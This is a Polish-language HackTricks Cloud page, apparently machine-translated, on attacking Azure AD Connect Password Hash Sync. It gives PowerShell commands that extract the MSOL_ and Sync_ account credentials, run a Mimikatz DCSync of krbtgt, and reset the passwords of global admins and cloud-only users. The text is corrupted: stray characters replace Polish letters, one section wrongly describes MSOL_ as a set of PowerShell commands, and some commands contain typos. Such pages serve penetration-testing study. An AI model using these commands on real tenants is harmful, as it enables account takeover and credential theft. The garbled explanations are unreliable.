# Az - PHS - Synchronizacja hasa

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Podstawowe informacje

[Z dokumentacji:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-phs) **Synchronizacja hasa** jest jedn z metod logowania u偶ywan do osignicia hybrydowej to偶samoci. **Azure AD Connect** synchronizuje skr贸t skr贸tu hasa u偶ytkownika z lokalnej instancji Active Directory do chmurowej instancji Azure AD.

<figure><img src="../../../../.gitbook/assets/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

To jest **najczstsza metoda** u偶ywana przez firmy do synchronizacji lokalnej AD z Azure AD.

Wszyscy **u偶ytkownicy** i **skr贸t skr贸t贸w hasa** s synchronizowani z lokalnej instancji do Azure AD. Jednak **hasa w postaci tekstu jawnego** lub **oryginalne skr贸ty** nie s wysyane do Azure AD.\
Ponadto, **wbudowane** grupy zabezpiecze (takie jak administratorzy domeny...) nie s synchronizowane z Azure AD.

Synchronizacja **skr贸t贸w** odbywa si co **2 minuty**. Jednak domylnie **wyganicie hasa** i **wyganicie konta** nie s synchronizowane w Azure AD. Dlatego u偶ytkownik, kt贸rego **haso lokalne wygaso** (niezmienione), mo偶e nadal **uzyskiwa dostp do zasob贸w Azure** za pomoc starego hasa.

Kiedy u偶ytkownik lokalny chce uzyska dostp do zasobu Azure, **uwierzytelnienie odbywa si w Azure AD**.

**PHS** jest wymagane dla funkcji takich jak **Ochrona to偶samoci** i Usugi domen AAD.

## Pivoting

Po skonfigurowaniu PHS automatycznie tworzone s niekt贸re **konta uprzywilejowane**:

* Konto **`MSOL_<installationID>`** jest automatycznie tworzone w lokalnej AD. Temu kontu przypisywana jest rola **Konta synchronizacji katalogu** (patrz [dokumentacja](https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-assign-admin-roles#directory-synchronization-accounts-permissions)), co oznacza, 偶e ma **uprawnienia replikacji (DCSync) w lokalnej AD**.
* Konto **`Sync_<nazwa serwera Azure ADConnect w lokalnej AD>_installationID`** jest tworzone w Azure AD. To konto mo偶e **resetowa haso DOWOLNEGO u偶ytkownika** (synchronizowanego lub tylko w chmurze) w Azure AD.

Hasa dw贸ch wczeniej wymienionych kont uprzywilejowanych s **przechowywane w serwerze SQL** na serwerze, na kt贸rym zainstalowany jest **Azure AD Connect**. Administratorzy mog wyodrbni hasa tych uprzywilejowanych u偶ytkownik贸w w postaci tekstu jawnego.\
Baza danych znajduje si w `C:\Program Files\Microsoft Azure AD Sync\Data\ADSync.mdf`.

Mo偶liwe jest wyodrbnienie konfiguracji z jednej z tabel, z kt贸rych jedna jest zaszyfrowana:

`SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent;`

**Zaszyfrowana konfiguracja** jest zaszyfrowana za pomoc **DPAPI** i zawiera hasa u偶ytkownika `MSOL_*` w lokalnej AD oraz haso **Sync\_\*** w AzureAD. Dlatego kompromitujc te dane, mo偶liwe jest podniesienie uprawnie do AD i AzureAD.

Mo偶na znale藕 [peny przegld tego, jak te powiadczenia s przechowywane i odszyfrowywane w tej prezentacji](https://www.youtube.com/watch?v=JEIR5oGCwdg).

### Znajdowanie **serwera Azure AD Connect**

Jeli **serwer, na kt贸rym zainstalowany jest Azure AD Connect**, jest doczony do domeny (zalecane w dokumentacji), mo偶na go znale藕 za pomoc:
```powershell
# ActiveDirectory module
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" - Properties * | select SamAccountName,Description | fl

#Azure AD module
Get-AzureADUser -All $true | ?{$_.userPrincipalName -match "Sync_"}
```
### Wykorzystywanie MSOL\_\*

MSOL\_\* to zestaw polece PowerShell dostpnych w module MSOnline, kt贸ry jest czci narzdzia Azure AD Connect. Te polecenia s u偶ywane do zarzdzania usug Azure Active Directory (Azure AD). Jednak偶e, niekt贸re z tych polece mog by wykorzystane w celu uzyskania nieautoryzowanego dostpu lub przeprowadzenia ataku lateralnego w rodowisku hybrydowym Azure AD Connect.

#### PHS (Password Hash Sync)

PHS (Password Hash Sync) to funkcja w Azure AD Connect, kt贸ra synchronizuje skr贸ty hase u偶ytkownik贸w z lokalnej infrastruktury Active Directory do Azure AD. Ta funkcja jest u偶ywana do umo偶liwienia u偶ytkownikom logowania si do usug w chmurze przy u偶yciu tych samych hase, kt贸re u偶ywaj do logowania si do lokalnych zasob贸w.

Atakujcy mo偶e wykorzysta PHS do uzyskania skr贸t贸w hase u偶ytkownik贸w z Azure AD i nastpnie przeprowadzi atak offline w celu zamania tych hase. Jeli atakujcy uzyska dostp do skr贸t贸w hase, mo偶e to prowadzi do naruszenia poufnoci i bezpieczestwa danych u偶ytkownik贸w.

#### Zabezpieczenia

Aby zabezpieczy si przed nadu偶yciem MSOL\_\* i atakami na PHS, zaleca si podjcie nastpujcych dziaa:

1. Regularnie aktualizuj Azure AD Connect do najnowszej wersji, aby korzysta z najnowszych zabezpiecze.
2. Upewnij si, 偶e masz silne haso dla konta usugi Azure AD Connect.
3. Ogranicz dostp do konta usugi Azure AD Connect tylko do niezbdnych u偶ytkownik贸w.
4. Monitoruj logi zdarze Azure AD Connect w celu wykrywania podejrzanej aktywnoci.
5. Wcz monitorowanie i alarmowanie w przypadku podejrzanej aktywnoci zwizanej z PHS.

Przestrzeganie tych zalece pomo偶e w zabezpieczeniu rodowiska hybrydowego Azure AD Connect przed nadu偶yciem MSOL\_\* i atakami na PHS.
```powershell
# Once the Azure AD connect server is compromised you can extract credentials with the AADInternals module
Get-AADIntSyncCredentials

# Using the creds of MSOL_* account, you can run DCSync against the on-prem AD
runas /netonly /user:defeng.corp\MSOL_123123123123 cmd
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt /domain:domain.local /dc:dc.domain.local"'
```
{% hint style="danger" %}
Mo偶esz r贸wnie偶 u偶y [**adconnectdump**](https://github.com/dirkjanm/adconnectdump), aby uzyska te powiadczenia.
{% endhint %}

### Nadu偶ywanie Sync\_\*

Kompromitujc konto **`Sync_*`**, mo偶liwe jest **zresetowanie hasa** dowolnego u偶ytkownika (w tym Globalnych Administrator贸w)
```powershell
# This command, run previously, will give us alse the creds of this account
Get-AADIntSyncCredentials

# Get access token for Sync_* account
$passwd = ConvertTo-SecureString '<password>' -AsPlainText - Force
$creds = New-Object System.Management.Automation.PSCredential ("Sync_SKIURT-JAUYEH_123123123123@domain.onmicrosoft.com", $passwd)
Get-AADIntAccessTokenForAADGraph -Credentials $creds - SaveToCache

# Get global admins
Get-AADIntGlobalAdmins

# Get the ImmutableId of an on-prem user in Azure AD (this is the Unique Identifier derived from on-prem GUID)
Get-AADIntUser -UserPrincipalName onpremadmin@domain.onmicrosoft.com | select ImmutableId

# Reset the users password
Set-AADIntUserPassword -SourceAnchor "3Uyg19ej4AHDe0+3Lkc37Y9=" -Password "JustAPass12343.%" -Verbose

# Now it's possible to access Azure AD with the new password and op-prem with the old one (password changes aren't sync)
```
Jest r贸wnie偶 mo偶liwe **zmodyfikowanie hase tylko dla u偶ytkownik贸w chmury** (nawet jeli jest to nieoczekiwane)
```powershell
# To reset the password of cloud only user, we need their CloudAnchor that can be calculated from their cloud objectID
# The CloudAnchor is of the format USER_ObjectID.
Get-AADIntUsers | ?{$_.DirSyncEnabled -ne "True"} | select UserPrincipalName,ObjectID

# Reset password
Set-AADIntUserPassword -CloudAnchor "User_19385ed9-sb37-c398-b362-12c387b36e37" -Password "JustAPass12343.%" -Verbosewers
```
Mo偶liwe jest r贸wnie偶 wykradnicie hasa tego u偶ytkownika.

{% hint style="danger" %}
Inn opcj jest **przydzielenie uprzywilejowanych uprawnie dla usugi g贸wnej**, kt贸re u偶ytkownik **Sync** ma **uprawnienia** do wykonania, a nastpnie **uzyskanie dostpu do tej usugi g贸wnej** jako metody eskalacji uprawnie.
{% endhint %}

### Bezproblemowe SSO

Mo偶liwe jest u偶ycie Bezproblemowego SSO z PHS, co jest podatne na inne nadu偶ycia. Sprawd藕 to w:

{% content-ref url="seamless-sso.md" %}
[seamless-sso.md](seamless-sso.md)
{% endcontent-ref %}

## Odwoania

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-phs](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-phs)
* [https://aadinternals.com/post/on-prem\_admin/](https://aadinternals.com/post/on-prem\_admin/)
* [https://troopers.de/downloads/troopers19/TROOPERS19\_AD\_Im\_in\_your\_cloud.pdf](https://troopers.de/downloads/troopers19/TROOPERS19\_AD\_Im\_in\_your\_cloud.pdf)
* [https://www.youtube.com/watch?v=xei8lAPitX8](https://www.youtube.com/watch?v=xei8lAPitX8)

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi trikami hakerskimi, przesyajc PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
